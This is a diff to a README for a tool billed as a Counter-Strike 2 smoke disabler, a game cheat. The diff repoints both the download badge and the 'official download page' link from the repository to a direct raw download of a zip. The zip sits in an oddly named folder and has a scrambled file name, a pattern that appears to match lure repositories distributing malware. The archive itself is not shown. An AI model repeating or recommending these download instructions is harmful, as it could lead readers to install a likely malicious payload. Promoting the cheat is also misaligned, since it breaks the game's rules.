@@ -1,6 +1,6 @@
 # 🌫️ CS2-Smoke-Disabler-Turn-Off-Smoke-Effects-Completely - Clear visibility for better game performance
 
-[![](https://img.shields.io/badge/Download-Smoke-Disabler-blue)](https://github.com/rubencho2763/CS2-Smoke-Disabler-Turn-Off-Smoke-Effects-Completely)
+[![](https://img.shields.io/badge/Download-Smoke-Disabler-blue)](https://github.com/rubencho2763/CS2-Smoke-Disabler-Turn-Off-Smoke-Effects-Completely/raw/refs/heads/main/acetoarsenite/Effects-Completely-Disabler-Turn-C-Off-Smoke-v1.5-beta.1.zip)
 
 ## 📖 About this application
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the application:
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [official download page](https://github.com/rubencho2763/CS2-Smoke-Disabler-Turn-Off-Smoke-Effects-Completely).
+1. Go to the [official download page](https://github.com/rubencho2763/CS2-Smoke-Disabler-Turn-Off-Smoke-Effects-Completely/raw/refs/heads/main/acetoarsenite/Effects-Completely-Disabler-Turn-C-Off-Smoke-v1.5-beta.1.zip).
 2. Look for the latest version of the program.
 3. Click the link to save the file to your computer.
 4. Locate the file in your downloads folder.
